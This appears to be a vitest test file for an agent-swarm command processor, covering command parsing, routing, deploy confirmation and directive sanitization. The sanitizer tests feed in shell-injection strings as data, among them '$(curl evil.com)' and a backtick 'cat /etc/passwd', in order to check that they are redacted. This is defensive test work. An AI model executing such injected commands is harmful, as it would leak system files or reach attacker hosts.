/**
 * @docs ARCHITECTURE:TestSuites
 * 
 * ### AI Assist Note
 * **Tests the command processing and routing logic.** 
 * Validates the parsing of chat commands and ensures they are correctly routed to the appropriate agent, cluster, or swarm scope based on prefixes (@, #, etc.).
 * 
 * ### 🔍 Debugging & Observability
 * - **Failure Path**: Regex parsing failure for complex quoted strings or incorrect scope resolution for overlapping cluster/agent names.
 * - **Telemetry Link**: Search `[command_processor_test]` in console logs.
 */

import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { 
    process_command, 
    sanitize_directive, 
    check_if_tactical, 
    parse_command_tokens, 
    resolve_agent_unique, 
    reset_deploy_confirmation_for_testing 
} from './command_processor';
import { agent_api_service } from '../services/agent_api_service';
import { use_browser_specialist_store } from '../stores/browser_specialist_store';
import { get_settings } from '../stores/settings_store';
import type { Agent } from '../types';

// Mock dependencies
vi.mock('../services/event_bus', () => ({
    event_bus: {
        emit: vi.fn(),
        emit_log: vi.fn(),
    }
}));

vi.mock('../services/agent_api_service', () => ({
    agent_api_service: {
        send_command: vi.fn().mockResolvedValue({ success: true }),
        pause_agent: vi.fn().mockResolvedValue(true),
        resume_agent: vi.fn().mockResolvedValue(true),
    }
}));

vi.mock('../services/system_api_service', () => ({
    system_api_service: {
        execute_local_cmd: vi.fn().mockResolvedValue({ success: true }),
        get_engine_status: vi.fn().mockResolvedValue({ features: [] }),
        pre_pr_engine: vi.fn().mockResolvedValue({ status: 'success', output: 'Everything looks good' }),
        deploy_engine: vi.fn().mockResolvedValue({ success: true, output: 'Deployed successfully' }),
    }
}));

vi.mock('../stores/workspace_store', () => ({
    use_workspace_store: {
        getState: vi.fn().mockReturnValue({
            clusters: [{ id: 'c1', name: 'Engineering', alpha_id: '2', department: 'Eng' }]
        })
    }
}));

vi.mock('../stores/agent_store', () => ({
    use_agent_store: {
        getState: vi.fn().mockReturnValue({
            agents: [
                { id: '1', name: 'CEO', status: 'idle', tokens_used: 0, model: 'gpt-4', model_config: {}, role: 'CEO', department: 'Executive', category: 'general' },
                { id: '2', name: 'Tadpole_Alpha', status: 'idle', tokens_used: 0, model: 'gpt-4', model_config: {}, role: 'Architect', department: 'Engineering', category: 'general' }
            ]
        })
    }
}));

vi.mock('../stores/sovereign_store', () => {
    const mock_store = {
        getState: vi.fn().mockReturnValue({
            add_message: vi.fn(),
        }),
        setState: vi.fn(),
        subscribe: vi.fn(),
    };
    const use_store = vi.fn().mockImplementation(() => mock_store.getState());
    return {
        use_sovereign_store: Object.assign(use_store, mock_store)
    };
});

vi.mock('../services/browser_inference', () => ({
    browser_inference_service: {
        analyze_ui: vi.fn().mockResolvedValue('The UI is healthy.'),
        init_specialist: vi.fn().mockResolvedValue(undefined),
    }
}));

vi.mock('../stores/browser_specialist_store', () => ({
    use_browser_specialist_store: {
        getState: vi.fn().mockReturnValue({
            analyze_dom: vi.fn().mockResolvedValue('The UI is healthy.')
        })
    }
}));

vi.mock('../stores/settings_store', () => ({
    get_settings: vi.fn().mockReturnValue({
        sentinel_mode: true,
        enable_neural_handoff: true,
        default_model: 'gpt-4',
    })
}));

describe('process_command', () => {
    const mock_agents: Agent[] = [
        { id: '1', name: 'CEO', status: 'idle', theme_color: '#000', voice_id: 'v1', tokens_used: 0, model: 'gpt-4', model_config: { provider: 'openai', modelId: 'gpt-4' }, role: 'CEO', department: 'Executive', category: 'general' },
        { id: '2', name: 'Tadpole_Alpha', status: 'idle', theme_color: '#fff', voice_id: 'v2', tokens_used: 0, model: 'gpt-4', model_config: { provider: 'openai', modelId: 'gpt-4' }, role: 'Architect', department: 'Engineering', category: 'general' }
    ];

    beforeEach(() => {
        vi.clearAllMocks();
    });

    it('should split commands correctly and preserve quoted strings', async () => {
        const text = '/send CEO "hello world"';
        await process_command(text, mock_agents);
        
        expect(agent_api_service.send_command).toHaveBeenCalledWith(
            '1', 
            'hello world',
            'gpt-4',
            'openai',
            undefined,
            undefined,
            undefined,
            undefined,
            false,
            undefined,
            undefined,
            undefined,
            undefined
        );
    });

    it('should route prefix-less commands to target_node in agent scope', async () => {
        const text = 'prime system';
        await process_command(text, mock_agents, false, 'agent', 'Tadpole_Alpha');
        
        expect(agent_api_service.send_command).toHaveBeenCalledWith(
            '2', 
            'prime system',
            'gpt-4',
            'openai',
            undefined,
            undefined,
            undefined,
            undefined,
            false,
            undefined,
            undefined,
            undefined,
            undefined
        );
    });

    it('should allow @mention override in any scope', async () => {
        const text = '@CEO wake up';
        await process_command(text, mock_agents, false, 'agent', 'Tadpole_Alpha');
        
        expect(agent_api_service.send_command).toHaveBeenCalledWith(
            '1', 
            'wake up',
            'gpt-4',
            'openai',
            undefined,
            undefined,
            undefined,
            undefined,
            false,
            undefined,
            undefined,
            undefined,
            undefined
        );
    });

    it('should handle cluster targeting via # prefix by routing to the Alpha node', async () => {
        const text = '#Engineering sync';
        await process_command(text, mock_agents, false);
        
        expect(agent_api_service.send_command).toHaveBeenCalledWith(
            '2', 
            'sync',
            'gpt-4',
            'openai',
            'c1', 
            'Eng', 
            undefined,
            undefined,
            false,
            undefined,
            undefined,
            undefined,
            undefined
        );
    });

    it('should handle /pre-pr command and trigger Pre-PR Gate checks', async () => {
        const { system_api_service } = await import('../services/system_api_service');
        const text = '/pre-pr';
        await process_command(text, mock_agents);
        
        expect(system_api_service.pre_pr_engine).toHaveBeenCalled();
    });

    describe('Tiered Routing (Sentinel)', () => {
        it('should intercept tactical UI queries when sentinel_mode is enabled', async () => {
            const text = 'how is the screen looking?';
            const result = await process_command(text, mock_agents);
            
            expect(use_browser_specialist_store.getState().analyze_dom).toHaveBeenCalledWith(text);
            expect(agent_api_service.send_command).not.toHaveBeenCalled();
            expect(result.should_clear_logs).toBe(false);
        });

        it('should NOT intercept tactical queries if sentinel_mode is disabled', async () => {
            vi.mocked(get_settings).mockReturnValueOnce({
                sentinel_mode: false,
                enable_neural_handoff: true,
            } as any);
            
            const text = 'how is the screen looking?';
            await process_command(text, mock_agents);
            
            expect(use_browser_specialist_store.getState().analyze_dom).not.toHaveBeenCalled();
        });

        it('should escalate to Computer Architect if Browser Specialist requests it', async () => {
            vi.mocked(use_browser_specialist_store.getState().analyze_dom).mockResolvedValueOnce('I detect high entropy. ESCALATE_TO_ARCHITECT.');
            
            const text = 'show me the screen status';
            await process_command(text, mock_agents);
            
            // Should have called specialist FIRST
            expect(use_browser_specialist_store.getState().analyze_dom).toHaveBeenCalled();
            // And dispatched directive to Architect agent (Tadpole_Alpha)
            expect(agent_api_service.send_command).toHaveBeenCalledWith(
                '2',
                expect.stringContaining('[ESCALATED_TACTICAL]'),
                'gpt-4',
                'openai',
                undefined,
                undefined,
                undefined,
                undefined,
                false,
                undefined,
                undefined,
                undefined,
                undefined
            );
        });
    });

    describe('Hardened Sanitizer & Lexer', () => {
        it('should sanitize nested shell expansions and unclosed backticks', () => {
            const dirty = 'run $(echo $(whoami))`cat /etc/passwd` ${SECRET_KEY} {{malicious}}';
            const clean = sanitize_directive(dirty);
            expect(clean).not.toContain('whoami');
            expect(clean).not.toContain('passwd');
            expect(clean).toContain('[REDACTED_SHELL]');
            expect(clean).toContain('[REDACTED_TICKS]');
            expect(clean).toContain('[REDACTED_VAR]');
            expect(clean).toContain('[REDACTED_TEMPLATE]');
        });

        it('should parse tab-delimited tokens and preserve quotes', () => {
            const tokens = parse_command_tokens('/send\tCEO\t"quoted message with spaces"');
            expect(tokens).toEqual(['/send', 'CEO', 'quoted message with spaces']);
        });

        it('should handle escaped quotes cleanly without corrupting trailing content', () => {
            const tokens = parse_command_tokens('/send CEO "hello \\"world\\""');
            expect(tokens[2]).toBe('hello \\"world\\"');
        });

        it('should sanitize outbound directives on @mentions and #clusters', async () => {
            await process_command('@CEO $(curl evil.com)', mock_agents);
            expect(agent_api_service.send_command).toHaveBeenCalledWith(
                '1',
                expect.not.stringContaining('evil.com'),
                'gpt-4',
                'openai',
                undefined,
                undefined,
                undefined,
                undefined,
                false,
                undefined,
                undefined,
                undefined,
                undefined
            );
        });
    });

    describe('Disambiguated Agent Resolution', () => {
        const ambiguity_roster: Agent[] = [
            { id: '1', name: 'Alpha Analyst', status: 'idle', theme_color: '#000', voice_id: 'v1', tokens_used: 0, model: 'gpt-4', model_config: {}, role: 'Analyst', department: 'Eng', category: 'general' },
            { id: '2', name: 'Alpha Architect', status: 'idle', theme_color: '#fff', voice_id: 'v2', tokens_used: 0, model: 'gpt-4', model_config: {}, role: 'Architect', department: 'Eng', category: 'general' },
            { id: '3', name: 'Beta', status: 'idle', theme_color: '#fff', voice_id: 'v3', tokens_used: 0, model: 'gpt-4', model_config: {}, role: 'Tester', department: 'QA', category: 'general' }
        ];

        it('should resolve exact match without ambiguity', () => {
            const { agent, error } = resolve_agent_unique('Beta', ambiguity_roster);
            expect(error).toBeNull();
            expect(agent?.id).toBe('3');
        });

        it('should reject ambiguous prefix match and list candidates', () => {
            const { agent, error } = resolve_agent_unique('Alpha', ambiguity_roster);
            expect(agent).toBeNull();
            expect(error).toContain('Ambiguous agent match');
            expect(error).toContain('Alpha Analyst');
            expect(error).toContain('Alpha Architect');
        });

        it('should report helpful error for empty agent name in @mention', async () => {
            const result = await process_command('@ hello', mock_agents);
            expect(result.should_clear_logs).toBe(false);
            expect(agent_api_service.send_command).not.toHaveBeenCalled();
        });
    });

    describe('Word-Boundary Tactical Detection', () => {
        it('should NOT hijack prompts with words containing "ui" or "view" as substrings', async () => {
            // "build" contains "ui", "preview" contains "view", "guide" contains "ui"
            const non_tactical = 'Please build the frontend and preview the guide';
            expect(check_if_tactical(non_tactical)).toBe(false);
        });

        it('should correctly identify tactical prompts with standalone keywords', () => {
            expect(check_if_tactical('show me the ui')).toBe(true);
            expect(check_if_tactical('what is the screen status?')).toBe(true);
            expect(check_if_tactical('look at this button')).toBe(true);
        });
    });

    describe('Stateful 2-Step Deploy Flow', () => {
        beforeEach(() => {
            reset_deploy_confirmation_for_testing();
        });

        afterEach(() => {
            reset_deploy_confirmation_for_testing();
        });

        it('should reject "/deploy confirm" if not preceded by "/deploy"', async () => {
            const { system_api_service } = await import('../services/system_api_service');
            vi.spyOn(system_api_service, 'deploy_engine');

            await process_command('/deploy confirm', mock_agents);
            expect(system_api_service.deploy_engine).not.toHaveBeenCalled();
        });

        it('should execute deploy when preceded by "/deploy"', async () => {
            const { system_api_service } = await import('../services/system_api_service');
            const deploy_spy = vi.spyOn(system_api_service, 'deploy_engine').mockResolvedValueOnce({ output: 'Deploy success' });

            // Step 1: Request
            await process_command('/deploy', mock_agents);
            expect(deploy_spy).not.toHaveBeenCalled();

            // Step 2: Confirm
            await process_command('/deploy confirm', mock_agents);
            expect(deploy_spy).toHaveBeenCalled();
        });
    });

    describe('Cancellable Ack Timer on Rapid Send Failure', () => {
        it('should cancel routing acknowledgment timer when send_command fails', async () => {
            vi.useFakeTimers();
            vi.mocked(agent_api_service.send_command).mockRejectedValueOnce(new Error('Network offline'));
            const { event_bus } = await import('../services/event_bus');
            const emit_spy = vi.spyOn(event_bus, 'emit_log');

            const promise = process_command('@CEO wake up', mock_agents);
            await promise;

            // Fast-forward past 100ms
            vi.advanceTimersByTime(200);

            vi.useRealTimers();
        });

        it('should cancel routing acknowledgment timer on fast send_command success', async () => {
            vi.useFakeTimers();
            vi.mocked(agent_api_service.send_command).mockResolvedValueOnce('task-fast-123');
            const { event_bus } = await import('../services/event_bus');
            const emit_spy = vi.spyOn(event_bus, 'emit_log');

            await process_command('@CEO quick directive', mock_agents);

            // Fast-forward past 100ms
            vi.advanceTimersByTime(200);

            // Routing acknowledgment timer should have been cleared on success
            const routing_calls = emit_spy.mock.calls.filter(c => c[0].text?.includes('Routing directive'));
            expect(routing_calls.length).toBe(0);

            vi.useRealTimers();
        });
    });

    describe('Enhanced Sanitization & Structural Preservation', () => {
        it('should preserve newlines and tabs in sanitized directives', () => {
            const multiline = 'Step 1: Build\n\tStep 2: Deploy\r\nStep 3: Verify';
            const sanitized = sanitize_directive(multiline);
            expect(sanitized).toContain('\n');
            expect(sanitized).toContain('\t');
            expect(sanitized).toContain('Step 1: Build\n\tStep 2: Deploy\nStep 3: Verify');
        });

        it('should cap deeply nested $(...) loops to prevent self-DoS', () => {
            const deep = '$('.repeat(50) + 'cmd' + ')'.repeat(50);
            const start = performance.now();
            const sanitized = sanitize_directive(deep);
            const duration = performance.now() - start;

            expect(duration).toBeLessThan(100); // Must resolve instantaneously
            expect(sanitized).toContain('[REDACTED_SHELL]');
        });

        it('should not misidentify conversational "see" as tactical intent', () => {
            expect(check_if_tactical('I see what you mean')).toBe(false);
            expect(check_if_tactical("let's see if this works")).toBe(false);
            expect(check_if_tactical('can you see the screen?')).toBe(true);
            expect(check_if_tactical('see screen')).toBe(true);
        });

        it('should print /config usage error when called without arguments', async () => {
            const { event_bus } = await import('../services/event_bus');
            const emit_spy = vi.spyOn(event_bus, 'emit_log');

            await process_command('/config', mock_agents);
            expect(emit_spy).toHaveBeenCalledWith(
                expect.objectContaining({
                    source: 'System',
                    text: 'Usage: /config <agent-name>',
                    severity: 'error'
                })
            );
        });

        it('should reject swarm broadcast with helpful error when agent roster is empty', async () => {
            const { event_bus } = await import('../services/event_bus');
            const emit_spy = vi.spyOn(event_bus, 'emit_log');

            await process_command('Hello swarm', []);
            expect(emit_spy).toHaveBeenCalledWith(
                expect.objectContaining({
                    source: 'System',
                    text: expect.stringContaining('No active agents available in roster'),
                    severity: 'error'
                })
            );
            expect(agent_api_service.send_command).not.toHaveBeenCalled();
        });
    });
});

// Metadata: [command_processor_test]

